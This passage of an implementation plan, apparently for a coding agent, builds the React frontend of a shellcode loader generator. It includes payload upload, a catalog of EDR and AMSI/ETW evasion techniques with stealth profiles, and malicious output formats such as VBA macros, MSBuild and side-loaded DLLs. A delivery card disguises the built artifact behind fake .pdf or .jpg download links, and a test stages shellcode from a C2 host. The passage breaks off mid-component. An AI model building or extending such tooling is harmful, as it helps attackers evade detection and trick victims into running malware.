  onShellcodeHexChange: vi.fn(),
  binFilename: null,
  stages: [],
  onFileUpload: vi.fn(),
  onStageUpload: vi.fn(),
  onStageDelete: vi.fn(),
}

describe('PayloadSection', () => {
  it('renders mode selector cards', () => {
    render(React.createElement(PayloadSection, defaultProps))
    expect(screen.getByText(/Stageless/i)).toBeInTheDocument()
    expect(screen.getByText(/Staged/i)).toBeInTheDocument()
  })

  it('shows file upload zone in stageless mode', () => {
    render(React.createElement(PayloadSection, defaultProps))
    expect(screen.getByText(/Upload .bin/i)).toBeInTheDocument()
  })

  it('calls onModeChange when staged mode card is clicked', () => {
    const onModeChange = vi.fn()
    render(React.createElement(PayloadSection, { ...defaultProps, onModeChange }))
    fireEvent.click(screen.getByText(/Staged/i))
    expect(onModeChange).toHaveBeenCalledWith('staged')
  })

  it('shows staged list when mode is staged', () => {
    render(React.createElement(PayloadSection, {
      ...defaultProps,
      mode: 'staged',
      stages: [{ pid: 'abc123', name: 'shell.bin', size: 512, arch: 'x64', created_at: '0' }],
    }))
    expect(screen.getByText(/abc123/)).toBeInTheDocument()
    expect(screen.getByText(/shell.bin/)).toBeInTheDocument()
  })
})
```

- [ ] **Step 2: Run to verify failure**

```bash
cd frontend && npm test -- components/__tests__/PayloadSection 2>&1 | tail -10
```

- [ ] **Step 3: Implement PayloadSection.tsx**

Create `frontend/src/components/PayloadSection.tsx`:

```tsx
import { useRef } from 'react'
import { StagePayload } from '../api/stage'

type Mode = 'stageless' | 'staged'

interface Props {
  mode:                Mode
  onModeChange:        (m: Mode) => void
  shellcodeHex:        string
  onShellcodeHexChange:(hex: string) => void
  binFilename:         string | null
  stages:              StagePayload[]
  onFileUpload:        (file: File) => void
  onStageUpload:       (file: File) => void
  onStageDelete:       (pid: string) => void
}

export default function PayloadSection({
  mode, onModeChange, shellcodeHex, onShellcodeHexChange,
  binFilename, stages, onFileUpload, onStageUpload, onStageDelete,
}: Props) {
  const fileRef  = useRef<HTMLInputElement>(null)
  const stageRef = useRef<HTMLInputElement>(null)

  function handleBinChange(e: React.ChangeEvent<HTMLInputElement>) {
    const f = e.target.files?.[0]
    if (f) onFileUpload(f)
  }

  function handleStageChange(e: React.ChangeEvent<HTMLInputElement>) {
    const f = e.target.files?.[0]
    if (f) onStageUpload(f)
  }

  return (
    <section id="section-payload" className="space-y-4">
      <h2 className="text-xs font-semibold uppercase tracking-widest" style={{ color: 'var(--ink-muted)' }}>
        01 — Payload
      </h2>

      {/* Mode cards */}
      <div className="grid grid-cols-2 gap-3">
        {(['stageless', 'staged'] as Mode[]).map(m => (
          <button
            key={m}
            type="button"
            onClick={() => onModeChange(m)}
            className="rounded-xl p-4 text-left transition"
            style={{
              border: `1px solid ${mode === m ? 'var(--blue-500)' : 'var(--border)'}`,
              backgroundColor: mode === m ? 'var(--blue-alpha)' : 'var(--surface)',
              color: mode === m ? 'var(--blue-500)' : 'var(--ink-muted)',
            }}
          >
            <div className="font-semibold text-sm capitalize">{m === 'stageless' ? 'A: Stageless' : 'B: Staged'}</div>
            <div className="text-xs mt-1" style={{ color: 'var(--ink-muted)' }}>
              {m === 'stageless' ? 'Shellcode embedded in loader' : 'Shellcode fetched at runtime'}
            </div>
          </button>
        ))}
      </div>

      {/* Stageless: hex input + file upload */}
      {mode === 'stageless' && (
        <div className="space-y-3">
          <div className="flex items-center justify-between">
            <label className="text-xs" style={{ color: 'var(--ink-muted)' }}>Shellcode (hex)</label>
            <div className="flex items-center gap-2">
              {binFilename && (
                <span className="text-xs font-mono truncate max-w-[160px]" style={{ color: 'var(--blue-500)' }}>
                  {binFilename}
                </span>
              )}
              <button
                type="button"
                onClick={() => fileRef.current?.click()}
                className="text-xs px-2 py-1 rounded-lg transition"
                style={{ border: '1px solid var(--border)', color: 'var(--ink-muted)' }}
              >
                Upload .bin
              </button>
              <input ref={fileRef} type="file" accept=".bin,application/octet-stream" className="hidden" onChange={handleBinChange} />
            </div>
          </div>
          <textarea
            rows={4}
            placeholder="fc4883e4f0e8… or upload a .bin file"
            value={shellcodeHex}
            onChange={e => onShellcodeHexChange(e.target.value)}
            className="w-full rounded-lg px-3 py-2 text-xs font-mono focus:outline-none resize-none"
            style={{ backgroundColor: 'var(--surface-2)', border: '1px solid var(--border)', color: 'var(--ink)' }}
          />
        </div>
      )}

      {/* Staged: list + upload button */}
      {mode === 'staged' && (
        <div className="space-y-2">
          {stages.map(s => (
            <div
              key={s.pid}
              className="flex items-center justify-between rounded-lg px-3 py-2"
              style={{ border: '1px solid var(--border)', backgroundColor: 'var(--surface-2)' }}
            >
              <div>
                <span className="text-xs font-mono" style={{ color: 'var(--ink)' }}>{s.name}</span>
                <span className="text-xs ml-2 font-mono" style={{ color: 'var(--ink-muted)' }}>{s.pid}</span>
              </div>
              <div className="flex items-center gap-2">
                <span className="text-xs" style={{ color: 'var(--ink-muted)' }}>{(s.size / 1024).toFixed(1)} KB</span>
                <button
                  type="button"
                  onClick={() => onStageDelete(s.pid)}
                  className="text-xs px-2 py-0.5 rounded transition"
                  style={{ color: 'var(--danger)', border: '1px solid var(--danger)' }}
                >
                  Remove
                </button>
              </div>
            </div>
          ))}
          <button
            type="button"
            onClick={() => stageRef.current?.click()}
            className="w-full rounded-lg py-2 text-xs font-medium transition"
            style={{ border: '1px dashed var(--border)', color: 'var(--ink-muted)' }}
          >
            + Stage another .bin
          </button>
          <input ref={stageRef} type="file" accept=".bin,application/octet-stream" className="hidden" onChange={handleStageChange} />
        </div>
      )}
    </section>
  )
}
```

- [ ] **Step 4: Run tests**

```bash
cd frontend && npm test -- components/__tests__/PayloadSection 2>&1 | tail -5
```

Expected: PASS (4 tests).

- [ ] **Step 5: Commit**

```bash
git add frontend/src/components/PayloadSection.tsx frontend/src/components/__tests__/PayloadSection.test.tsx
git commit -m "feat: add PayloadSection with stageless/staged mode selector"
```

---

## Task 9: EvasionSection component

**Files:**
- Create: `frontend/src/components/EvasionSection.tsx`
- Create: `frontend/src/components/__tests__/EvasionSection.test.tsx`

- [ ] **Step 1: Write failing tests**

Create `frontend/src/components/__tests__/EvasionSection.test.tsx`:

```tsx
import { render, screen, fireEvent } from '@testing-library/react'
import { describe, it, expect, vi } from 'vitest'
import React from 'react'
import EvasionSection from '../EvasionSection'
import type { Feature, Encryption } from '../../api/generate'

const defaultProps = {
  features: [] as Feature[],
  encryption: 'Aes256' as Encryption,
  onFeaturesChange: vi.fn(),
  onEncryptionChange: vi.fn(),
}

describe('EvasionSection', () => {
  it('renders three profile cards', () => {
    render(React.createElement(EvasionSection, defaultProps))
    expect(screen.getByText('Stealth')).toBeInTheDocument()
    expect(screen.getByText('Balanced')).toBeInTheDocument()
    expect(screen.getByText('Aggressive')).toBeInTheDocument()
  })

  it('renders technique group headings', () => {
    render(React.createElement(EvasionSection, defaultProps))
    expect(screen.getByText(/Syscalls/i)).toBeInTheDocument()
    expect(screen.getByText(/Anti-analysis/i)).toBeInTheDocument()
  })

  it('selecting Stealth profile calls onFeaturesChange with stealth features', () => {
    const onFeaturesChange = vi.fn()
    render(React.createElement(EvasionSection, { ...defaultProps, onFeaturesChange }))
    fireEvent.click(screen.getByText('Stealth'))
    expect(onFeaturesChange).toHaveBeenCalledWith(
      expect.arrayContaining(['DirectSyscall', 'AmsiHwbp', 'EtwHwbp', 'SleepEncrypt'])
    )
  })

  it('shows enabled count per group', () => {
    render(React.createElement(EvasionSection, {
      ...defaultProps,
      features: ['DirectSyscall' as Feature],
    }))
    expect(screen.getByText(/1\/\d+ enabled/)).toBeInTheDocument()
  })
})
```

- [ ] **Step 2: Run to verify failure**

```bash
cd frontend && npm test -- components/__tests__/EvasionSection 2>&1 | tail -10
```

- [ ] **Step 3: Implement EvasionSection.tsx**

Create `frontend/src/components/EvasionSection.tsx`:

```tsx
import { Feature, Encryption, PROFILE_FEATURES, PROFILE_ENCRYPTION, Profile } from '../api/generate'

interface TechItem { id: string; name: string; risk: 'low' | 'med' | 'high'; desc: string; feature?: Feature; encryption?: Encryption }
interface TechGroup { id: string; name: string; items: TechItem[] }

const TECH_GROUPS: TechGroup[] = [
  {
    id: 'syscalls', name: 'Syscalls & API resolution',
    items: [
      { id: 'indirect_syscalls', name: 'Indirect syscalls (Hell\'s Hall)', risk: 'low', desc: 'Resolve SSNs from clean NTDLL, jump through ntdll gadget.', feature: 'DirectSyscall' },
      { id: 'ntdll_unhook',      name: 'NTDLL unhook from \\KnownDlls',   risk: 'low', desc: 'Re-map fresh ntdll .text to overwrite inline hooks.',       feature: 'UnhookKnownDlls' },
    ],
  },
  {
    id: 'encryption', name: 'Shellcode encryption',
    items: [
      { id: 'aes_gcm_payload',  name: 'AES-256-GCM (recommended)', risk: 'low',  desc: 'Authenticated encryption, per-build key.', encryption: 'Aes256' },
      { id: 'chacha20_payload', name: 'ChaCha20-Poly1305',          risk: 'low',  desc: 'Fast auth encryption, no AES-NI required.', encryption: 'Chacha20' },
    ],
  },
  {
    id: 'injection', name: 'Execution & injection',
    items: [
      { id: 'module_stomping', name: 'Module stomping',    risk: 'low', desc: 'Overwrite benign signed DLL .text. MEM_IMAGE not MEM_PRIVATE.', feature: 'ModuleStomp' },
      { id: 'ppid_spoof',      name: 'PPID spoofing',      risk: 'low', desc: 'Child appears to descend from explorer.exe.',                  feature: 'PpidSpoof' },
    ],
  },
  {
    id: 'memory', name: 'Memory & sleep',
    items: [
      { id: 'ekko_sleep',  name: 'Ekko sleep mask',       risk: 'low', desc: 'Encrypt heap + .text during sleep, restore on wake.', feature: 'SleepEncrypt' },
      { id: 'stack_spoof', name: 'Call stack spoofing',   risk: 'low', desc: 'Synthetic return addresses from ntdll/kernel32.',     feature: 'StackSpoof' },
    ],
  },
  {
    id: 'anti', name: 'Anti-analysis',
    items: [
      { id: 'amsi_hwbp', name: 'AMSI hardware-breakpoint bypass', risk: 'low', desc: 'DR0 breakpoint on AmsiScanBuffer — zero memory IOC.', feature: 'AmsiHwbp' },
      { id: 'etw_patch',  name: 'ETW-Ti patch',                   risk: 'low', desc: 'Neuter EtwEventWrite via byte patch.',                  feature: 'EtwHwbp' },
    ],
  },
]

const PROFILES: { id: Profile; name: string; score: number; tagline: string }[] = [
  { id: 'stealth',    name: 'Stealth',    score: 92, tagline: 'Maximum opsec. Slow, quiet, surgical.' },
  { id: 'balanced',   name: 'Balanced',   score: 76, tagline: 'Reasonable footprint, broad EDR coverage.' },
  { id: 'aggressive', name: 'Aggressive', score: 54, tagline: 'Loud but versatile.' },
]

const RISK_COLOR: Record<string, string> = { low: 'var(--ok)', med: 'var(--warn)', high: 'var(--danger)' }

interface Props {
  features:           Feature[]
  encryption:         Encryption
  onFeaturesChange:   (f: Feature[]) => void
  onEncryptionChange: (e: Encryption) => void
}

export default function EvasionSection({ features, encryption, onFeaturesChange, onEncryptionChange }: Props) {
  function isTechActive(item: TechItem): boolean {
    if (item.feature)    return features.includes(item.feature)
    if (item.encryption) return encryption === item.encryption
    return false
  }

  function toggleTech(item: TechItem) {
    if (item.feature) {
      onFeaturesChange(
        features.includes(item.feature)
          ? features.filter(f => f !== item.feature)
          : [...features, item.feature]
      )
    } else if (item.encryption) {
      onEncryptionChange(item.encryption)
    }
  }

  function applyProfile(p: Profile) {
    onFeaturesChange(PROFILE_FEATURES[p])
    onEncryptionChange(PROFILE_ENCRYPTION[p])
  }

  return (
    <section id="section-evasion" className="space-y-6">
      <h2 className="text-xs font-semibold uppercase tracking-widest" style={{ color: 'var(--ink-muted)' }}>
        03 — Evasion
      </h2>

      {/* Profile cards */}
      <div className="grid grid-cols-3 gap-3">
        {PROFILES.map(p => (
          <button
            key={p.id}
            type="button"
            onClick={() => applyProfile(p.id)}
            className="rounded-xl p-4 text-left transition"
            style={{ border: '1px solid var(--border)', backgroundColor: 'var(--surface)' }}
          >
            <div className="font-semibold text-sm" style={{ color: 'var(--ink)' }}>{p.name}</div>
            <div className="text-xs mt-1" style={{ color: 'var(--ink-muted)' }}>{p.tagline}</div>
            <div className="mt-3 flex items-center gap-2">
              <div className="h-1.5 flex-1 rounded-full" style={{ backgroundColor: 'var(--border)' }}>
                <div className="h-full rounded-full" style={{ width: `${p.score}%`, backgroundColor: 'var(--blue-500)' }} />
              </div>
              <span className="text-xs font-mono" style={{ color: 'var(--ink-muted)' }}>{p.score}/100</span>
            </div>
          </button>
        ))}
      </div>

      {/* Technique groups */}
      {TECH_GROUPS.map(group => {
        const activeCount = group.items.filter(isTechActive).length
        return (
          <div key={group.id}>
            <div className="flex items-center justify-between mb-2">
              <span className="text-xs font-medium" style={{ color: 'var(--ink)' }}>{group.name}</span>
              <span className="text-xs font-mono" style={{ color: 'var(--ink-muted)' }}>
                {activeCount}/{group.items.length} enabled
              </span>
            </div>
            <div className="grid grid-cols-1 gap-2">
              {group.items.map(item => {
                const active = isTechActive(item)
                return (
                  <button
                    key={item.id}
                    type="button"
                    role="switch"
                    aria-checked={active}
                    onClick={() => toggleTech(item)}
                    className="text-left rounded-xl p-3 transition"
                    style={{
                      border: `1px solid ${active ? 'var(--blue-500)' : 'var(--border)'}`,
                      backgroundColor: active ? 'var(--blue-alpha)' : 'var(--surface)',
                    }}
                  >
                    <div className="flex items-center justify-between">
                      <div className="flex items-center gap-2">
                        <div className="w-2 h-2 rounded-full" style={{ backgroundColor: active ? 'var(--blue-500)' : 'var(--border)' }} />
                        <span className="text-sm font-medium" style={{ color: 'var(--ink)' }}>{item.name}</span>
                      </div>
                      <span className="text-[10px] px-1.5 py-0.5 rounded font-mono uppercase" style={{ color: RISK_COLOR[item.risk], border: `1px solid ${RISK_COLOR[item.risk]}` }}>
                        {item.risk}
                      </span>
                    </div>
                    <p className="text-xs mt-1 ml-4" style={{ color: 'var(--ink-muted)' }}>{item.desc}</p>
                  </button>
                )
              })}
            </div>
          </div>
        )
      })}
    </section>
  )
}
```

- [ ] **Step 4: Run tests**

```bash
cd frontend && npm test -- components/__tests__/EvasionSection 2>&1 | tail -5
```

Expected: PASS (4 tests).

- [ ] **Step 5: Commit**

```bash
git add frontend/src/components/EvasionSection.tsx frontend/src/components/__tests__/EvasionSection.test.tsx
git commit -m "feat: add EvasionSection with profile grid and technique toggles"
```

---

## Task 10: OutputSection component

**Files:**
- Create: `frontend/src/components/OutputSection.tsx`
- Create: `frontend/src/components/__tests__/OutputSection.test.tsx`

- [ ] **Step 1: Write failing tests**

Create `frontend/src/components/__tests__/OutputSection.test.tsx`:

```tsx
import { render, screen, fireEvent } from '@testing-library/react'
import { describe, it, expect, vi } from 'vitest'
import React from 'react'
import OutputSection from '../OutputSection'

describe('OutputSection', () => {
  it('renders 8 format cards', () => {
    render(React.createElement(OutputSection, { loaderType: 'Binary', onLoaderTypeChange: vi.fn(), encryption: 'Aes256', onEncryptionChange: vi.fn() }))
    expect(screen.getAllByRole('radio')).toHaveLength(8)
  })

  it('marks selected format as active', () => {
    render(React.createElement(OutputSection, { loaderType: 'Wsf', onLoaderTypeChange: vi.fn(), encryption: 'Aes256', onEncryptionChange: vi.fn() }))
    const wsfCard = screen.getByTestId('format-wsf')
    expect(wsfCard).toHaveAttribute('aria-checked', 'true')
  })

  it('calls onLoaderTypeChange on card click', () => {
    const onChange = vi.fn()
    render(React.createElement(OutputSection, { loaderType: 'Binary', onLoaderTypeChange: onChange, encryption: 'Aes256', onEncryptionChange: vi.fn() }))
    fireEvent.click(screen.getByTestId('format-dll'))
    expect(onChange).toHaveBeenCalledWith('Dll')
  })
})
```

- [ ] **Step 2: Run to verify failure**

```bash
cd frontend && npm test -- components/__tests__/OutputSection 2>&1 | tail -10
```

- [ ] **Step 3: Implement OutputSection.tsx**

Create `frontend/src/components/OutputSection.tsx`:

```tsx
import { LoaderType, Encryption } from '../api/generate'

interface FormatCard {
  id:       string
  name:     string
  ext:      string
  opsec:    'high' | 'med' | 'low' | 'n/a'
  notes:    string
  loader:   LoaderType
}

const FORMATS: FormatCard[] = [
  { id: 'exe',         name: 'Native EXE',       ext: '.exe',          opsec: 'high', notes: 'Standalone PE. Best for USB / archive initial access.', loader: 'Binary' },
  { id: 'dll',         name: 'Native DLL',       ext: '.dll',          opsec: 'high', notes: 'DllMain or exported entry. Pair with sideloading.',      loader: 'Dll' },
  { id: 'appdomain',   name: 'AppDomainManager', ext: '.dll+.config',  opsec: 'high', notes: 'Hijack signed .NET binary via DLL/CONFIG side-load.',    loader: 'AppDomain' },
  { id: 'wsf',         name: 'WSF script',       ext: '.wsf',          opsec: 'med',  notes: 'wscript/cscript. JScript+VBS hybrid.',                  loader: 'Wsf' },
  { id: 'vba',         name: 'VBA macro',         ext: '.bas/.docm',   opsec: 'low',  notes: 'Office macro. MOTW friction post-2022.',                 loader: 'DocxMacro' },
  { id: 'msbuild',     name: 'MSBuild project',   ext: '.csproj',      opsec: 'high', notes: 'Inline task XML via trusted MS-signed binary.',          loader: 'MsBuild' },
  { id: 'installutil', name: 'InstallUtil',       ext: '.dll',         opsec: 'med',  notes: 'Uninstall method abuse via signed .NET installer.',       loader: 'InstallUtil' },
  { id: 'shellcode',   name: 'Raw shellcode',     ext: '.bin',         opsec: 'n/a',  notes: 'Position-independent blob for your own loader.',         loader: 'Binary' },
]

const OPSEC_COLOR: Record<string, string> = {
  high: 'var(--ok)', med: 'var(--warn)', low: 'var(--danger)', 'n/a': 'var(--ink-muted)',
}

const LOLBIN_ROADMAP = ['regsvr32', 'mshta', 'rundll32', 'regasm', 'cmstp', 'msiexec', 'wmic']

interface Props {
  loaderType:         LoaderType
  onLoaderTypeChange: (t: LoaderType) => void
  encryption:         Encryption
  onEncryptionChange: (e: Encryption) => void
}

export default function OutputSection({ loaderType, onLoaderTypeChange, encryption, onEncryptionChange }: Props) {
  return (
    <section id="section-output" className="space-y-4">
      <h2 className="text-xs font-semibold uppercase tracking-widest" style={{ color: 'var(--ink-muted)' }}>
        04 — Output
      </h2>

      {/* Format grid */}
      <div className="grid grid-cols-2 gap-2">
        {FORMATS.map(f => {
          const active = loaderType === f.loader && !(f.id === 'shellcode' && loaderType !== 'Binary')
          return (
            <button
              key={f.id}
              type="button"
              role="radio"
              aria-checked={loaderType === f.loader}
              data-testid={`format-${f.id}`}
              onClick={() => onLoaderTypeChange(f.loader)}
              className="text-left rounded-xl p-3 transition"
              style={{
                border: `1px solid ${loaderType === f.loader ? 'var(--blue-500)' : 'var(--border)'}`,
                backgroundColor: loaderType === f.loader ? 'var(--blue-alpha)' : 'var(--surface)',
              }}
            >
              <div className="flex items-center justify-between mb-1">
                <span className="text-sm font-medium" style={{ color: 'var(--ink)' }}>{f.name}</span>
                <span className="text-[10px] font-mono" style={{ color: OPSEC_COLOR[f.opsec] }}>
                  {f.opsec}
                </span>
              </div>
              <div className="text-[10px] font-mono" style={{ color: 'var(--ink-muted)' }}>{f.ext}</div>
              <div className="text-xs mt-1" style={{ color: 'var(--ink-muted)' }}>{f.notes}</div>
            </button>
          )
        })}
      </div>

      {/* LOLBIN roadmap chips */}
      <div>
        <span className="text-xs mr-2" style={{ color: 'var(--ink-muted)' }}>Roadmap:</span>
        {LOLBIN_ROADMAP.map(l => (
          <span key={l} className="inline-block mr-1 mb-1 text-[10px] px-1.5 py-0.5 rounded" style={{ border: '1px solid var(--border)', color: 'var(--ink-muted)' }}>
            {l}
          </span>
        ))}
      </div>
    </section>
  )
}
```

- [ ] **Step 4: Run tests**

```bash
cd frontend && npm test -- components/__tests__/OutputSection 2>&1 | tail -5
```

Expected: PASS (3 tests).

- [ ] **Step 5: Commit**

```bash
git add frontend/src/components/OutputSection.tsx frontend/src/components/__tests__/OutputSection.test.tsx
git commit -m "feat: add OutputSection format grid with opsec badges"
```

---

## Task 11: BuildConsole + DeliveryCard

**Files:**
- Create: `frontend/src/components/BuildConsole.tsx`
- Create: `frontend/src/components/DeliveryCard.tsx`
- Create: `frontend/src/components/__tests__/BuildConsole.test.tsx`

- [ ] **Step 1: Write failing tests**

Create `frontend/src/components/__tests__/BuildConsole.test.tsx`:

```tsx
import { render, screen, fireEvent } from '@testing-library/react'
import { describe, it, expect, vi } from 'vitest'
import React from 'react'
import BuildConsole from '../BuildConsole'

const defaultProps = {
  logs: [],
  status: 'idle' as const,
  canForge: true,
  onForge: vi.fn(),
  artifactId: null,
  artifactName: null,
}

describe('BuildConsole', () => {
  it('renders Forge button when idle', () => {
    render(React.createElement(BuildConsole, defaultProps))
    expect(screen.getByRole('button', { name: /forge/i })).toBeInTheDocument()
  })

  it('disables Forge button when canForge is false', () => {
    render(React.createElement(BuildConsole, { ...defaultProps, canForge: false }))
    expect(screen.getByRole('button', { name: /forge/i })).toBeDisabled()
  })

  it('shows log lines when provided', () => {
    render(React.createElement(BuildConsole, {
      ...defaultProps,
      logs: [{ ts: '12:00:00', tag: 'info', msg: 'compiling loader' }],
    }))
    expect(screen.getByText(/compiling loader/)).toBeInTheDocument()
  })

  it('shows building status badge', () => {
    render(React.createElement(BuildConsole, { ...defaultProps, status: 'building' }))
    expect(screen.getByText(/Building/i)).toBeInTheDocument()
  })
})
```

- [ ] **Step 2: Run to verify failure**

```bash
cd frontend && npm test -- components/__tests__/BuildConsole 2>&1 | tail -10
```

- [ ] **Step 3: Implement DeliveryCard.tsx**

Create `frontend/src/components/DeliveryCard.tsx`:

```tsx
import { useState } from 'react'

const EXTENSIONS = ['.pdf', '.jpg', '.png', '.gif', '.iso', '.zip', '.svg', '.jpeg']

interface Props {
  artifactName: string
  stageHost:    string
}

export default function DeliveryCard({ artifactName, stageHost }: Props) {
  const [ext, setExt] = useState('.pdf')
  const baseName = artifactName.replace(/\.[^.]+$/, '')
  const fakeName = `${baseName}${ext}`
  const linkId   = Math.random().toString(36).slice(2, 10)

  return (
    <div className="rounded-xl p-4 space-y-3" style={{ border: '1px solid var(--border)', backgroundColor: 'var(--surface-2)' }}>
      <div className="text-xs font-semibold uppercase tracking-widest" style={{ color: 'var(--ink-muted)' }}>
        Delivery
      </div>

      {/* Extension picker */}
      <div className="flex flex-wrap gap-1">
        {EXTENSIONS.map(e => (
          <button
            key={e}
            type="button"
            onClick={() => setExt(e)}
            className="text-[10px] px-2 py-0.5 rounded font-mono transition"
            style={{
              border: `1px solid ${ext === e ? 'var(--blue-500)' : 'var(--border)'}`,
              backgroundColor: ext === e ? 'var(--blue-alpha)' : 'transparent',
              color: ext === e ? 'var(--blue-500)' : 'var(--ink-muted)',
            }}
          >
            {e}
          </button>
        ))}
      </div>

      {/* URL preview */}
      <div className="rounded-lg px-3 py-2 font-mono text-xs break-all" style={{ backgroundColor: 'var(--surface)', color: 'var(--ink-muted)' }}>
        https://{stageHost}/d/{linkId}/{fakeName}
      </div>

      <button
        type="button"
        className="w-full py-2 rounded-lg text-xs font-medium transition"
        style={{ backgroundColor: 'var(--blue-500)', color: '#fff' }}
        onClick={() => navigator.clipboard?.writeText(`https://${stageHost}/d/${linkId}/${fakeName}`)}
      >
        Copy link
      </button>
    </div>
  )
}
```

- [ ] **Step 4: Implement BuildConsole.tsx**

Create `frontend/src/components/BuildConsole.tsx`:

```tsx
import { useRef, useEffect } from 'react'
import DeliveryCard from './DeliveryCard'

export interface LogLine { ts: string; tag: string; msg: string }
export type BuildStatus = 'idle' | 'building' | 'done' | 'error'

const TAG_COLOR: Record<string, string> = {
  info: 'var(--blue-500)', ok: 'var(--ok)', warn: 'var(--warn)', step: 'var(--blue-500)', err: 'var(--danger)',
}

const STATUS_LABEL: Record<BuildStatus, string> = {
  idle: 'Idle', building: 'Building', done: 'Complete', error: 'Error',
}

const STATUS_COLOR: Record<BuildStatus, string> = {
  idle: 'var(--ink-muted)', building: 'var(--warn)', done: 'var(--ok)', error: 'var(--danger)',
}

interface Props {
  logs:         LogLine[]
  status:       BuildStatus
  canForge:     boolean
  onForge:      () => void
  artifactId:   string | null
  artifactName: string | null
}

export default function BuildConsole({ logs, status, canForge, onForge, artifactId, artifactName }: Props) {
  const logRef = useRef<HTMLDivElement>(null)

  useEffect(() => {
    if (logRef.current) logRef.current.scrollTop = logRef.current.scrollHeight
  }, [logs])

  return (
    <div
      className="sticky top-[60px] flex flex-col rounded-xl overflow-hidden"
      style={{ border: '1px solid var(--border)', backgroundColor: 'var(--surface)', height: 'calc(100vh - 80px)' }}
    >
      {/* Header */}
      <div className="flex items-center justify-between px-4 py-3" style={{ borderBottom: '1px solid var(--border)' }}>
        <span className="text-xs font-semibold" style={{ color: 'var(--ink)' }}>Build console</span>
        <span className="text-xs font-mono" style={{ color: STATUS_COLOR[status] }}>
          ● {STATUS_LABEL[status]}
        </span>
      </div>

      {/* Log area */}
      <div ref={logRef} className="flex-1 overflow-y-auto px-3 py-2 font-mono text-xs space-y-0.5">
        {logs.length === 0 && (
          <p className="text-xs" style={{ color: 'var(--ink-muted)' }}>Ready. Configure and hit Forge.</p>
        )}
        {logs.map((l, i) => (
          <div key={i} className="flex gap-2">
            <span style={{ color: 'var(--ink-muted)' }}>{l.ts}</span>
            <span style={{ color: TAG_COLOR[l.tag] ?? 'var(--ink-muted)' }}>[{l.tag}]</span>
            <span style={{ color: 'var(--ink)' }}>{l.msg}</span>
          </div>
        ))}
      </div>

      {/* Artifact card (shown after build) */}
      {status === 'done' && artifactId && artifactName && (
        <div className="px-3 pb-2">
          <div className="rounded-lg px-3 py-2 flex items-center justify-between" style={{ border: '1px solid var(--border)', backgroundColor: 'var(--surface-2)' }}>
            <span className="text-xs font-mono truncate" style={{ color: 'var(--ink)' }}>{artifactName}</span>
            <a
              href={`/api/download/${artifactId}`}
              className="text-xs px-2 py-1 rounded transition ml-2"
              style={{ border: '1px solid var(--blue-500)', color: 'var(--blue-500)' }}
            >
              Download
            </a>
          </div>
          <div className="mt-2">
            <DeliveryCard artifactName={artifactName} stageHost="localhost:8080" />
          </div>
        </div>
      )}

      {/* Forge button */}
      <div className="px-3 pb-3">
        <button
          type="button"
          onClick={onForge}
          disabled={!canForge || status === 'building'}
          className="w-full py-2.5 rounded-lg font-semibold text-sm transition disabled:opacity-40 disabled:cursor-not-allowed"
          style={{ backgroundColor: 'var(--blue-500)', color: '#fff' }}
        >
          {status === 'building' ? 'Forging…' : 'Forge'}
        </button>
      </div>
    </div>
  )
}
```

- [ ] **Step 5: Run tests**

```bash
cd frontend && npm test -- components/__tests__/BuildConsole 2>&1 | tail -5
```

Expected: PASS (4 tests).

- [ ] **Step 6: Commit**

```bash
git add frontend/src/components/BuildConsole.tsx frontend/src/components/DeliveryCard.tsx frontend/src/components/__tests__/BuildConsole.test.tsx
git commit -m "feat: add BuildConsole with streaming log and DeliveryCard"
```

---

## Task 12: StageTransferSection

**Files:**
- Create: `frontend/src/components/StageTransferSection.tsx`
- Create: `frontend/src/components/__tests__/StageTransferSection.test.tsx`

- [ ] **Step 1: Write failing tests**

Create `frontend/src/components/__tests__/StageTransferSection.test.tsx`:

```tsx
import { render, screen } from '@testing-library/react'
import { describe, it, expect, vi } from 'vitest'
import React from 'react'
import StageTransferSection from '../StageTransferSection'
import type { StagePayload } from '../../api/stage'

const STAGE: StagePayload = { pid: 'abc123def456', name: 'shell.bin', size: 512, arch: 'x64', created_at: '0' }

describe('StageTransferSection', () => {
  it('renders endpoint URL containing pid', () => {
    render(React.createElement(StageTransferSection, {
      stages: [STAGE],
      tokens: { 'abc123def456': 'hdr.pay.sig' },
      stageHost: 'c2.example.com',
      onRotate: vi.fn(),
    }))
    expect(screen.getByText(/abc123def456/)).toBeInTheDocument()
  })

  it('renders JWT segments', () => {
    render(React.createElement(StageTransferSection, {
      stages: [STAGE],
      tokens: { 'abc123def456': 'hdr.pay.sig' },
      stageHost: 'c2.example.com',
      onRotate: vi.fn(),
    }))
    expect(screen.getByText('hdr')).toBeInTheDocument()
    expect(screen.getByText('pay')).toBeInTheDocument()
    expect(screen.getByText('sig')).toBeInTheDocument()
  })
})
```

- [ ] **Step 2: Run to verify failure**

```bash
cd frontend && npm test -- components/__tests__/StageTransferSection 2>&1 | tail -10
```

- [ ] **Step 3: Implement StageTransferSection.tsx**

Create `frontend/src/components/StageTransferSection.tsx`:

```tsx
import { StagePayload } from '../api/stage'

interface Props {
  stages:    StagePayload[]
  tokens:    Record<string, string>
  stageHost: string
  onRotate:  (pid: string) => void
}

const JWT_COLORS = ['#7c3aed', '#2f6bff', '#16a34a']

export default function StageTransferSection({ stages, tokens, stageHost, onRotate }: Props) {
  return (
    <section id="section-stage-transfer" className="space-y-4">
      <h2 className="text-xs font-semibold uppercase tracking-widest" style={{ color: 'var(--ink-muted)' }}>
        02 — Stage Transfer
      </h2>
      <p className="text-xs" style={{ color: 'var(--ink-muted)' }}>
        Each loader fetches shellcode at runtime using a Bearer JWT. Rotate to generate a new one-hour token. Tokens are signed HMAC-SHA256 — server validates before serving bytes.
      </p>
      {stages.map(s => {
        const jwt    = tokens[s.pid] ?? ''
        const parts  = jwt.split('.')
        const url    = `https://${stageHost}/api/v1/stage/${s.pid}`
        return (
          <div key={s.pid} className="rounded-xl p-4 space-y-3" style={{ border: '1px solid var(--border)', backgroundColor: 'var(--surface)' }}>
            {/* Endpoint bar */}
            <div className="flex items-center gap-2 rounded-lg px-3 py-2" style={{ backgroundColor: 'var(--surface-2)' }}>
              <span className="text-[10px] font-mono px-1.5 py-0.5 rounded" style={{ backgroundColor: 'var(--blue-alpha)', color: 'var(--blue-500)' }}>GET</span>
              <span className="text-xs font-mono truncate flex-1" style={{ color: 'var(--ink)' }}>{url}</span>
              <span className="text-[10px] px-1.5 py-0.5 rounded" style={{ color: 'var(--ok)', border: '1px solid var(--ok)' }}>staged</span>
            </div>

            {/* JWT display */}
            <div className="rounded-lg px-3 py-2 font-mono text-[10px] break-all leading-relaxed" style={{ backgroundColor: 'var(--surface-2)' }}>
              {parts.map((part, i) => (
                <span key={i}>
